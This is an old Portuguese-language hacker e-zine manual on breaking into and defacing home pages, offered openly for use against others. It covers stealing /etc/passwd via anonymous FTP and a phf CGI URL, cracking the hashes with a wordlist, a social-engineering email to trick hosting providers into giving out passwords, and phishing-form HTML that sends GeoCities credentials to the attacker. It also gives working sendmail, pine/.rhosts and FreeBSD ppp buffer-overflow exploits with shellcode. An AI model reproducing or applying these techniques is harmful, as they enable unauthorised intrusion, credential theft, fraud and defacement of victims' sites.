@@ -1,0 +1,444 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+                            
+                 3>#@<Mini manual de como hackear uma page>@#<3
+
+                            HACKEANDO HOME PAGES
+
+                                    by
+
+                                 Dead*Pool
+
+           Antes de mais nada muita gente pediu para colocar mais coisas sobre
+           como obter passwords de pages etc...
+           Aqui vai um mini manual isto nao é nada de muita coisa tanto que
+           muita coisa aqui só funciona em sistemas antigos. Mas para quem
+           quer saber é melhor que nada. Aqui esta sendo repetido o metodo
+           anonymous FTP que esta na FW1 o resto é lucro.
+                      
+           1-INTRODUCAO :
+
+           O texto a seguir fala sobre como hackear uma home page.
+           Aqui estao as suas seçoes :
+           -Precauçoes-cuidados que você deve tomar.
+           -Sobre as senhas-arquivos falando sobre as senhas.
+           -Desencryptando as senhas-como desencryptar senhas.
+           -Ftp-como hackear uma HP por ftp.
+           -Phf-como hackear uma HP usando o método phf.
+           -Home page grátis-como hackear servidores de home page grátis.
+           -Home page grátis segundo método de como hackear servidores de
+           home pages grátis.
+           -Já cadastrado-Como hackear uma home page que você já tenha
+           cadastro no mesmo servidor.
+           -Telnet e exploits-Como hackear uma page usando telnet e exploits
+           -Já cadastrado segundo método de como hackear uma hp que você já
+           tenha cadastro no mesmo servidor.
+           
+           2-PRECAUÇOES:
+
+           Nesse texto vou ensinar diversos métodos de como hackear uma home
+           page.
+           Toda vez que você entra em um sistema seu IP fica gravado e "eles"
+           vao poder te encontrar.
+           Portanto antes de cometer um ato como esse eu sugiro que vocês
+           tomem umas medidas de segurança como spoofing e etc...
+           
+           3-SOBRE AS SENHAS :
+
+           A senha esta em um arquivo chamado passwd. Esse arquivo esta
+           normalmente em um diretório chamado etc/passwd.
+           Entao vamos falar um pouco sobre o passwd.
+           Quando você pega o arquivo passwd, a senha pode vir encryptada ou
+           entao com shadow!
+           A diferença é que a senha encryptada é a própria senha só que esta
+           encryptada e a senha com shadow faz com que a senha fique escondida
+           em outro lugar! Ou seja, nao vai estar no passwd, vai estar em
+           outro diretório.
+
+           Para obter a senha escrita você vai ter que desencripta-la! As
+           senhas com shadow sao impossíveis de "desencryptar"!
+           (levando em conta que você nao tem unix).
+
+           Uma senha encryptada é mais ou menos assim :
+
+           root:User:d7Bdg:1n2HG2:1127:20:Superuser
+           TomJones:p5Y(h0tiC:1229:20:Tom Jones,:/usr/people/tomjones:/bin/csh
+           BBob:EUyd5XAAtv2dA:1129:20:Billy Bob:/usr/people/bbob:/bin/csh
+
+           Agora o exemplo de uma senha com shadow :
+
+           root:x:0:1:0000-Admin(0000):/:/usr/bin/csh
+           daemon:x:1:1:0000-Admin(0000):/:
+           bin:x:2:2:0000-Admin(0000):/usr/bin:
+           sys:x:3:3:0000-Admin(0000):/:
+           adm:x:4:4:0000-Admin(0000):/var/adm:
+           lp:x:71:8:0000-lp(0000):/usr/spool/lp:
+           smtp:x:0:0:mail daemon user:/:
+           uucp:x:5:5:0000-uucp(0000):/usr/lib/uucp:
+           nuucp:x:9:9:0000-uucp(0000):/var/spool/uucppublic:/usr/lib/uucp/
+           listen:x:37:4:Network Admin:/usr/net/nls:
+           nobody:x:60001:60001:uid no body:/:
+           noaccess:x:60002:60002:uid no access:/:
+           webmastr:x:53:53:WWW Admin:/export/home/webmastr:/usr/bin/csh
+           pin4geo:x:55:55:PinPaper Admin:/export/home/webmastr/new/gregY/
+           ftp:x:54:54:Anonymous FTP:/export/home/anon_ftp:/bin/false
+
+           Você pode notar que tem um "x" no root! Esse x pode ser
+           representado também por um "*".
+           Agora você já sabe um pouco mais sobre o arquivo passwd e sobre as
+           senhas.
+           
+           4-DESENCRYPTANDO :
+
+           Para desencryptar uma senha precisaremos de três arquivos básicos.
+           Uma word list, um desencryptador (recomendo o crackerjack/jack 14)
+           e logicamente o arquivo onde está senha(passwd).
+
+           O que é cada um?
+
+           Word list- Como o próprio nome já diz, é uma lista de palavras.
+           Desencryptador- é o programa que você vai usar para desencryptar a
+           senha.
+
+           Passwd- Nesse arquivo está a senha encryptada.
+
+           Coloque todos esses itens nesse mesmo diretório.
+           Abra o prompt do DOS e entre no diretório onde eles estao.
+           Agora faça o seguinte, digite :
+           "nome do programa desencryptador" "nome do arquivo onde esta a
+           senha" "nome da sua word list"
+           Entao vamos supor que meu programa é o jack, o arquivo é o passwd,
+           a word list á lista.
+           Entao ficaria assim :
+
+           jack passwd lista.txt
+
+           E pronto! A senha está desencryptada!
+           Mas como isso funciona??
+           Quando você roda o jack ele pega o arquivo passwd e testa com
+           todas as palavras da word list.
+           
+           5-FTP
+
+           Hackear uma HP por ftp talvez seja o melhor metodo. É bem simples
+           e rápido de ser feito.
+           Para fazer isso vamos usar o prompt do MS-DOS. Espero que você
+           saiba pelo menos mexer no básico do DOS. O que vamos faz é
+           simplesmente entrar no ftp da home page com login anonymous e
+           fazer o download do arquivo passwd.
+           Abra o prompt do DOS.
+           Você vai ter que entrar no ftp da HP que voce quer hackear.
+           Normalmente a endereþo é o mesmo da home page.
+           Entao digite ftp www.hackers.com
+           Ele vai pedir seu USER. Coloque anonymous.
+           Agora vai pedir que você coloque seu e-mail completo como senha.
+           Claro que você vai colocar alguma coisa qualquer, tipo
+           fuckyou@idiota.com.
+           Você vai entrar no ftp como user anonymous e retrictions applly!
+           Isso significa que você entrou como anonymous e com restriçoes
+           aplicadas!
+           Agora você precisa ir para o diretório etc.
+           Entre e faça o donwload do passwd.
+           Pra isso digite "get passwd".
+           Pronto, o arquivo passwd vai estar no diretório que você estava
+           quando entrou no ftp.
+           Tipo windows, arquivos de programas....
+           Agora você que tem o arquivo só precisa desencryptalo e pronto!
+           A senha estará em suas maos..
+           
+           6-PHF :
+
+           O phf é com certeza o modo mais simples de se obter o arquivo
+           passwd. É tao simples que você nao precisa saber nada!
+           A única coisa que você tem que fazer é abrir seu browser e colocar
+           uma URL.
+           Porém esse método tem  95% de chance de nao funcionar! 
+           A maioria dos servidores já acharam o bug e concertaram.
+           Só colocar essa URL no location do seu browser :
+
+     http://Endereço_da_pagina/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+           Apenas isso e pronto!
+           
+           7-HACKEANDO SERVIDORES DE HOME PAGES GRATIS (1):
+
+           Alguns servidores de home page tipo a geocities, tripod e a
+           angelfire, dao espaço para pessoas colocarem suas home pages no ar.
+           Há um modo bem simples de se obter a senha de home pages que estao
+           nesses servidores.
+           Tudo que voce tem que fazer é mandar um e-mail pedindo pra eles te
+           mandarem a senha da home page.
+           Mas nao mande um e-mail estúpido tipo : "por favor me mandem a
+           senha".
+           Façam algo mais convincente. Pegue todas as informaçoes da HP
+           possíveis. Do tipo :
+           "Mês passado eu me cadastrei no serviço de vocês e recebi uma
+           senha e um user name e meu endereço "endereço da HP do cara".
+           Eu coloquei algumas coisas no meu espaço e saí de férias.
+           Quando voltei das ferias eu tinha me esquecido da senha!!
+           Só me lembrava do user name, que é : "user name da HP".
+           Fiquei um bom tempo de ferias e nao pude pagar o provedor, por
+           isso estou com um e-mail diferente do que consta no cadastro de
+           vocês. O meu antigo e-mail era esse "mail do webmaster da HP"
+           Por favor preciso que vocês me mandem um e-mail para "seu e-mail".
+           Porque eu nao tenho o backup dos arquivos que coloquei lá e nao
+           gostaria de perde-los. Obrigado pela atençao. Espero que voces
+           mandem a senha o mais rápido que puderem."
+
+           Companhias como a geocities sao muito ocupadas pra ficar
+           verificando se é verdade eu nao!
+           Provavelmente eles iram acreditar e em 2 semanas(mais ou menos)
+           você receberá a senha no seu e-mail!
+           
+           8-HACKEANDO SERVIDORES DE HOME PAGES GRATIS (2):
+
+           Outro modo de hackear esse tipo de home pages é enganar o próprio
+           webmaster da HP!
+           Esse modo funciona normalmente com webmasters idiotas que nao
+           sabem muito coisa e nem percebem que eles mesmos estao dando a
+           senha para o hackeador.
+           É outro método bem simples mas um pouco mais demorado. O que você
+           tem que fazer é criar uma pagina onde você finge que é a geocities
+           que esta dando mais megas para HP's!
+           Ou seja, você terá que criar uma página imitando a geocities! Faça
+           uma pagina exatamente no estilo da da geo. E coloque tudo com as
+           mesmas gifs, mesmos banners e coloque um formulário pra ser
+           preenchido e diga que quem preencher aquilo vai ganhas mais 10
+           megas livre de espaço pra HP!!!
+           Nesse formulário o cara terá que colocar o user e a senha da HP, o
+           endereço e etc....
+           Para o cara "receber" os megas ele terá que enviar o formulário.
+           Para isso ela deverá clicar em algum botao de envio, normalmente
+           um botao que fica escrito "submit" Quando a pessoa clica no botao
+           submit formulário é enviado para a geocities pois aquele botao tem
+           um comando para enviar para a geocities.Entao o que você terá que
+           fazer é mudar o comando. Em vez do formulário ser enviado para a
+           geocities esse formulário vai ser enviado para o seu e-mail.
+           Para isso você terá que editar a pagina da geocities. No lugar que
+           tem escrito:
+
+<form action="/cgi-bin/homestead/file_manager" method=post></td>
+
+           Você tará que trocar para :
+
+<FORM ACTION="http://www.uky.edu/cgi-bin/cgiwrap/~johnr/AnyForm.cgi"
+METHOD="Post">
+<INPUT TYPE="Hidden" Name="AnyFormMode" Value="mail">
+<INPUT TYPE="Hidden" Name="AnyFormDisplay"
+Value="http://www.geocities.com/members/tools/file_manager.html">
+<INPUT TYPE="Hidden" Name="AnyFormTo" Value="Coloque seu e-mail aqui">
+<INPUT TYPE="Hidden" Name="AnyFormSubject" Value="Senha hackeada da
+geocities">
+
+           Entao assim que o cara clicar no botao submit todos os dados serao
+           enviados para o seu e-mail.
+           E assim você terá a senha.
+           Agora é só pegar um endereço na net e colocar essa pagina editada
+           na geocities nele e mandar as pessoas visitarem.
+           E pronto! O formulário vai chegar com a senha e user name no teu
+           e-mail.
+           
+           Há uma tecnica parecida com essa mas É MUITO mais complicada.
+           Pra isso você vai precisar de um servidor pessoal e terá que mudar
+           algumas configuraçoes em:
+
+           TCP/IP
+
+           Para isso abra o painel de controle e entre no ícone redes.
+           Agora entre nas propriedades de TCP/IP.
+           Entre na conficuraçao DNS.
+           Selecione ativar DNS. 
+           Agora escreva no HOST-->WWW.GEOClTIES(repare que geocities está
+           escrito com "l" e nao um "i")
+           Entao escreva no dominio-->COM.
+           Agora de OK em tudo. Vai pedir que você reinicie o micro. Pode
+           reiniciar.
+           Siga o mesmo procedimento do formulario e da pagina da geocities
+           da explicaçao anterior.
+           Salva essa pagina e coloque-a no diretório de paginas do seu
+           servidor.
+           Entao voce cria um diretório chamado "members", entra nesse
+           diretório e crie um, diretório chamado "tools". Coloque tudo da
+           page editada nesse diretório.
+           Coloque seu servidor pra funcionar e mande o cara entrar em :
+           HTTP://WWW.GEOClTIES.COM/members/tools/file_manager.html
+           O endereço tem que ser esse. Se a pessoa entrar no file manager da
+           geocities isso nao vai funcionar(ooohhh!!!)
+           Quando o cara colocar os dados dele lá e enviar estará tudo no teu
+           mail!
+ 
+           Queria avisar que esses metodos também funcionam com a angelfire e
+           com a tripod.
+           A geocities foi usada como exemplo.
+           
+           9-HACKEANDO UMA HP EM QUE VOCE JÁ TENHA CADASTRO NO MESMO SERVIDOR
+
+           Esse método é realmente difícil de funcionar mas as vezes funciona
+           com uns admins bem idiotas.(é o que nao falta por ai ;) )
+           Quando você entra no seu ftp você pode sair do seu diretório home
+           (diretorio onde você esta assim que entra) e voltar alguns
+           diretórios até encontrar o diretório da HP que você quer hackear.
+           Uma vez que voce já fez, se você puder ter acesso aos arquivos
+           HTML pegue-os e edite eles! E pronto!
+           Com admins mais inteligentes você nao consegue ter acesso os
+           arquivos da page alvo.
+
+           10-TELNET E EXPLOITS : 
+
+           Exploits é talvez o melhor método de hackear uma home page.
+           Mas ele é um pouco mais complicado do que os outros métodos como
+           phf e ftp.
+           Antes de tudo você vai precisar de um programa de telnet.
+           Exploits expoem erros e bugs nos sistemas e normalmente te dao
+           root, sysop, admin....
+           Vou listar alguns exploits abaixo :(olhe a FW 02 onde existem estes
+           e muitos outros exploits ou veja a seçao exploits desta FW)
+           ;-)
+
+           Esse se chama sendmail bug.
+           Ele cria um programa /tmp/x que chama shells como root.
+
+-----------------------------Corta
+cat << _EOF_ >/tmp/x.c
+ #define RUN "/bin/ksh"
+ #include<stdio.h>
+ main()
+ {
+    execl(RUN,RUN,NULL);
+ }
+_EOF_
+#
+cat << _EOF_ >/tmp/spawnfish.c
+ main()
+ {
+   execl("/usr/lib/sendmail","/tmp/smtpd",0);      
+ }                                             
+_EOF_
+#
+cat << _EOF_ >/tmp/smtpd.c
+ main()
+ {
+   setuid(0); setgid(0); 
+   system("chown root /tmp/x ;chmod 4755 /tmp/x");
+ }
+_EOF_
+#
+#
+gcc -O  -o /tmp/x /tmp/x.c
+gcc -O3 -o /tmp/spawnfish /tmp/spawnfish.c
+gcc -O3 -o /tmp/smtpd /tmp/smtpd.c
+#
+/tmp/spawnfish
+kill -HUP `/usr/ucb/ps -ax|grep /tmp/smtpd|grep -v grep|sed s/"[ ]*"// |cut -d" " -f1`
+rm /tmp/spawnfish.c /tmp/spawnfish /tmp/smtpd.c /tmp/smtpd /tmp/x.c
+sleep 5
+if [ -u /tmp/x ] ; then
+   echo "leet..."
+   /tmp/x
+-------------------------------------Corta
+
+           Agora mais um exploit. Eu vou mostrar o "pine exploit" vendo o
+           processo da tabela com ps você pode ver os usuário rodando o pine.
+           Um entao pode fazer um ls no /tmp/ pra conseguir o nome do lockfile
+           pra cada usuário. Vendo o processo da tabela de novo vai revelar
+           quais usuarios ou saem com mensagens nao lidas nos seus inbox.
+           Efetivamente deletando o lockfile respectivo. Criando um link
+           de /tmp/.hamors_lockfile para ~hamors/.rhosts vai fazer com que o
+           pine crie ~hamors/.rhosts como com um arquivo 666 com as
+           identidades processadas e que elas contém. Agora precisa fazer um
+           " echo "+ +" > /tmp/.hamors_lockfile e rm /tmp/.hamors_lockfile.
+           
+---------------------------------------Corta
+
+hamors (21 19:04) litterbox:~> pine
+
+catluvr (6 19:06) litterbox:~> ps -aux | grep pine
+catluvr   1739  0.0  1.8  100  356 pp3 S    19:07   0:00 grep pine
+hamors    1732  0.8  5.7  249 1104 pp2 S    19:05   0:00 pine
+
+catluvr (7 19:07) litterbox:~> ls -al /tmp/ | grep hamors
+- -rw-rw-rw-   1 hamors   elite           4 Aug 26 19:05 .302.f5a4
+
+catluvr (8 19:07) litterbox:~> ps -aux | grep pine
+catluvr   1744  0.0  1.8  100  356 pp3 S    19:08   0:00 grep pine
+
+catluvr (9 19:09) litterbox:~> ln -s /home/hamors/.rhosts /tmp/.302.f5a4
+
+hamors (23 19:09) litterbox:~> pine
+
+catluvr (11 19:10) litterbox:~> ps -aux | grep pine
+catluvr   1759  0.0  1.8  100  356 pp3 S    19:11   0:00 grep pine
+hamors    1756  2.7  5.1  226  992 pp2 S    19:10   0:00 pine
+
+catluvr (12 19:11) litterbox:~> echo "+ +" > /tmp/.302.f5a4
+
+catluvr (13 19:12) litterbox:~> cat /tmp/.302.f5a4
++ +
+
+catluvr (14 19:12) litterbox:~> rm /tmp/.302.f5a4
+
+catluvr (15 19:14) litterbox:~> rlogin litterbox.org -l hamors
+
+----------------------------------Corta
+
+           Esse é o último que vou relacionar aqui. Exploitation script para
+           vunerabilidade ppp. Funciona em "FreeBSD". 
+
+-------------------------Corta
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define BUFFER_SIZE     156     /* size of the bufer to overflow */
+
+#define OFFSET          -290    /* number of bytes to jump after the start
+                                   of the buffer */
+
+long get_esp(void) { __asm__("movl %esp,%eax\n"); }
+
+main(int argc, char *argv[])
+{
+        char *buf = NULL;
+        unsigned long *addr_ptr = NULL;
+        char *ptr = NULL;
+        char execshell[] =
+        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f" /* 16 bytes */
+        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52" /* 16 bytes */
+        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"  /* 20 bytes */
+        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";    /* 15 bytes, 57 total */
+   
+        int i,j;
+
+        buf = malloc(4096);
+
+        /* fill start of bufer with nops */
+
+        i = BUFFER_SIZE-strlen(execshell);
+
+        memset(buf, 0x90, i);
+        ptr = buf + i;
+
+        /* place exploit code into the buffer */
+
+        for(i = 0; i < strlen(execshell); i++) 
+                *ptr++ = execshell[i];
+
+        addr_ptr = (long *)ptr;
+        for(i=0;i < (104/4); i++)
+                *addr_ptr++ = get_esp() + OFFSET;
+
+        ptr = (char *)addr_ptr;
+        *ptr = 0;
+
+        setenv("HOME", buf, 1);
+
+        execl("/usr/sbin/ppp", "ppp", NULL);
+}
+
+----------------------------------Corta
+
+           Agora você tem o root. Faça o que você quiser! Mas eu trocaria
+           logo a senha da HP antes de mexer em qualquer coisa ou deletar.
+           
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
